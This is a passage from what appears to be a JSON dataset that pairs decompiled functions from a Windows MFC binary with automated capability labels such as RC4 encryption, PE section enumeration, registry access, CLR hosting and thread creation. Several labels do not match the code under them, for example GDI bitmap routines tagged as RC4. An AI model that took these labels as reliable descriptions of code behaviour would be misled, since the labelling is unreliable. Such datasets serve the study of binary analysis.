-0x24) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.00433ab0(uVar2);\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00433ab0();\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 0;\n    fcn.004337da();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004337da();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1887
    },
    "00434576": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_66h\n// WARNING: Variable defined which should be unmapped: lprc\n\nvoid __cdecl fcn.00434576(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint var_74h;\n    uint var_70h;\n    uint var_66h;\n    uint lprc;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint hdc;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint hDC;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hbr;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x40) = vtable.CDC.0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x50) = vtable.CDC.0;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x30) = vtable.CDC.0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = vtable.CBitmap.0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = vtable.CBrush.0;\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.0043375c(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.0043375c(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar1)(0);\n            iVar3 = fcn.0043375c(uVar2);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.GDI32.dll_GetObjectA)(*(*(unaff_EBP + 8) + 4), 0x18, unaff_EBP + -0x78);\n                if (iVar3 != 0) {\n                    fcn.00433ab0();\n                    iVar3 = fcn.0040a8de(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), *(unaff_EBP + -0x68), \n                                         *(unaff_EBP + -0x66), 0);\n                    pcVar1 = _sym.imp.GDI32.dll_CreateBitmap;\n                    if (iVar3 != 0) {\n                        uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, 0x44ff44);\n                        fcn.00433a59(uVar2);\n                        fcn.0040a8bd(unaff_EBP + -0x18);\n                        fcn.00433ab0();\n                        uVar2 = (*pcVar1)(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), 1, 1, 0);\n                        fcn.00433a59(uVar2);\n                        uVar2 = fcn.00433b14(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        *(unaff_EBP + 8) = uVar2;\n                        iVar3 = fcn.00433b14(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x14));\n                        *(unaff_EBP + -0x10) = iVar3;\n                        if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                            uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x3c), 0, 0);\n                            uVar2 = fcn.00432b4c(uVar2);\n                            pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                            (*_sym.imp.GDI32.dll_BitBlt)\n                                      (*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                       *(unaff_EBP + -0x3c), 0, 0, 0xcc0020);\n                            fcn.00432b4c(0xffffff);\n                            (*pcVar1)(*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0xee0086);\n                            fcn.00432b4c(uVar2);\n                            if (*(unaff_EBP + 0xc) == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            iVar3 = fcn.00433b14(*(unaff_EBP + -0x2c), uVar2);\n                            *(unaff_EBP + 0xc) = iVar3;\n                            if (iVar3 == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = fcn.00432c33(*(unaff_EBP + 0x10));\n                                uVar4 = fcn.00432b4c(*(unaff_EBP + 0x14));\n                                *(unaff_EBP + 0x14) = uVar4;\n                                *(unaff_EBP + -0x58) = *(unaff_EBP + -0x74);\n                                *(unaff_EBP + -0x54) = *(unaff_EBP + -0x70);\n                                *(unaff_EBP + -0x60) = 0;\n                                *(unaff_EBP + -0x5c) = 0;\n                                (*_sym.imp.USER32.dll_FillRect)\n                                          (*(unaff_EBP + -0x2c), unaff_EBP + -0x60, *(unaff_EBP + -0x1c));\n                                fcn.00432c33(uVar2);\n                                fcn.00432b4c(*(unaff_EBP + 0x14));\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x4c), 0, 0, 0x8800c6);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            fcn.00433b14(*(unaff_EBP + -0x2c), uVar2);\n                            fcn.00433b14(*(unaff_EBP + -0x4c), *(*(unaff_EBP + -0x10) + 4));\n                            fcn.00433b14(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -0x20) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.00433ab0();\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00433ab0();\n    *(unaff_EBP + -4) = 1;\n    fcn.004337da();\n    *(unaff_EBP + -4) = 0;\n    fcn.004337da();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004337da();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 2305
    },
    "00437d8c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437d8c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if ((arg_ch < arg_10h) || (arg_14h < arg_ch)) {\n        fcn.00437cd6(arg_8h, arg_10h, 0, arg_14h, 0, \"%I64u\", 0xf112);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0042f046": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0042f046(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.00444bc2();\n        iVar2 = fcn.0040bca3(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 272
    },
    "004307be": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.004307be(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    uVar2 = *(pcVar1 + 4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0040f5b4(uVar2, 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.00427f1a(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.00427f1a(4);\n    *(unaff_EBP + -4) = 2;\n    fcn.00427d37(7, 0);\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    pcVar3 = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    extraout_ECX[0x17] = pcVar3;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 458
    },
    "00444a96": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00444a96(code **param_1, uchar param_2)\n\n{\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 239
    },
    "00445580": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445580(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CCommandLineInfo.0;\n    fcn.00401200();\n    fcn.00401200();\n    fcn.00401200();\n    ppiVar3 = param_1[5] + -0x10;\n    piVar1 = param_1[5] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "00431854": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00431854(uint hKey, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint lpType;\n    uint lpData;\n    uint lpcbData;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar4 = false;\n    var_8h = 0;\n    lpData = fcn.004019c0(0x104);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    lpcbData = 0x104;\n    lpType = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n    if (iVar3 == 0) {\n        var_4h = 0;\n        iVar3 = (*pcVar1)(var_8h, hKey, &var_4h);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar3 == 0) {\n            hKey = 0;\n            iVar3 = (*pcVar1)(var_4h, \"InProcServer32\", &hKey);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0x44da68, 0, &lpType, lpData, &lpcbData);\n                bVar4 = iVar3 == 0;\n                (*pcVar2)(hKey);\n            }\n            (*pcVar2)(var_4h);\n        }\n        (*pcVar2)(var_8h);\n    }\n    fcn.004059a0(0xffffffff);\n    return bVar4;\n}\n",
        "token_count": 399
    },
    "0044582c": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0044582c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint lpSubKey)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint hKey;\n    uint var_ch_2;\n    uint var_14h;\n    uint var_10h;\n    uint phkResult;\n    uint var_120h;\n    uint var_11ch;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint in_stack_ffffff98;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x14) = *0x4640c8;\n    uVar1 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x10) = &phkResult;\n    phkResult = unaff_EDI;\n    var_120h = unaff_ESI;\n    var_11ch = unaff_EBX;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(*(unaff_EBP + 8), uVar1, unaff_EBP + -0x124);\n    if (iVar2 == 0) {\n        while( true ) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(*(unaff_EBP + -0x124), 0, unaff_EBP + -0x11c, 0x104);\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = unaff_EBP + -0x11c;\n            fcn.00401ce0();\n            *(unaff_EBP + -4) = 1;\n            iVar2 = fcn.0044582c(*(unaff_EBP + -0x124), unaff_EBP + -0x120, iVar2, phkResult, var_120h, var_11ch, \n                                 in_stack_fffffee4, in_stack_fffffee8, in_stack_fffffeec, in_stack_fffffef0, \n                                 in_stack_fffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, \n                                 in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                                 in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, in_stack_ffffff20, \n                                 in_stack_ffffff24, in_stack_ffffff28, in_stack_ffffff2c, in_stack_ffffff30, \n                                 in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                                 in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, \n                                 in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                                 in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, \n                                 in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, \n                                 in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, \n                                 in_stack_ffffff94, in_stack_ffffff98, in_stack_ffffff9c, in_stack_ffffffa0, \n                                 in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, \n                                 in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                                 in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, in_stack_ffffffe0, \n                                 in_stack_ffffffe4, var_14h_2, in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h);\n            *(unaff_EBP + -4) = 0;\n            fcn.00401200();\n            if (iVar2 != 0) break;\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        if ((iVar2 == 0x103) || (iVar2 == 0x3f2)) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(*(unaff_EBP + 8), **(unaff_EBP + 0xc));\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x124));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 2233
    },
    "00446873": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00446873(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x50), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 100), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 378
    },
    "00446904": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446904(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00446873();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 163
    },
    "00422d7e": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.00422d7e(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0042ed31();\n    iVar3 = fcn.00444bf8();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.00447a9e(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x90))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != 0) {\n                (**(*piVar2[7] + 0x60))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.0044ab41();\n    return uVar4;\n}\n",
        "token_count": 295
    },
    "004366ce": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004366ce(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.004270e9(param_2);\n    *(param_2 + 0x50) = param_1;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 72
    },
    "004366ee": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004366ee(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0042701c(param_2, 0);\n    fcn.00426fbe(uVar1);\n    *(param_2 + 0x50) = 0;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 96
    },
    "0043d242": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d242(int32_t param_1)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack8 = param_1;\n    iStack4 = param_1;\n    fcn.0043d0fa();\n    (**(**(param_1 + 0x68) + 0x134))(&iStack8, *(param_1 + 0x40) - *(param_1 + 0x38), 0x42);\n    fcn.00443675(*(param_1 + 0x68), *(param_1 + 0x48), *(param_1 + 0x4c), *(param_1 + 0x70) & 0x40 | 0x2004);\n    return;\n}\n",
        "token_count": 178
    },
    "00445ba0": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00445ba0(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042e579();\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[0xd] = *(unaff_EBP + 8);\n    pcVar1 = *(unaff_EBP + 0xc);\n    *extraout_ECX = vtable.CWinThread.0;\n    extraout_ECX[0xc] = pcVar1;\n    fcn.00445b63();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 236
    },
    "00445c00": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** fcn.00445c00(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042e579();\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CWinThread.0;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    fcn.00445b63();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 195
    },
    "004124f5": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004124f5(uint lpThreadAttributes, uint dwStackSize, int32_t arg_10h, uint arg_14h, uint dwCreationFlags, \n            uint *arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = arg_10h;\n    iVar3 = 0;\n    if (arg_10h == 0) {\n        puVar1 = fcn.004131f5();\n        *puVar1 = 0x16;\n    }\n    else {\n        arg_8h = fcn.004136f2(1, 0x8c);\n        if (arg_8h != 0) {\n            fcn.004144ee(arg_8h);\n            *(arg_8h + 4) = 0xffffffff;\n            *(arg_8h + 0x50) = arg_14h;\n            *(arg_8h + 0x4c) = iVar2;\n            puVar1 = arg_1ch;\n            if (arg_1ch == NULL) {\n                puVar1 = &arg_10h;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)\n                              (lpThreadAttributes, dwStackSize, 0x412460, arg_8h, dwCreationFlags, puVar1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.00411031(arg_8h);\n        if (iVar3 != 0) {\n            fcn.00413207(iVar3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 389
    },
    "0042f6ee": {
        "rules": [
            "resume thread"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042f6ee(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0042ff21();\n    if (piVar1 == NULL) {\n        fcn.00422e2d();\n    }\n    piVar1[0xc] = 0;\n    iVar2 = fcn.0042f589(arg_14h | 4, arg_10h, arg_18h);\n    if (iVar2 == 0) {\n        (**(*piVar1 + 0x78))();\n        piVar1 = NULL;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(piVar1[10], arg_ch);\n        if ((arg_14h & 4) == 0) {\n            (*_sym.imp.KERNEL32.dll_ResumeThread)(piVar1[10]);\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 242
    },
    "00401c20": {
        "rules": [
            "contain loop"
        ],
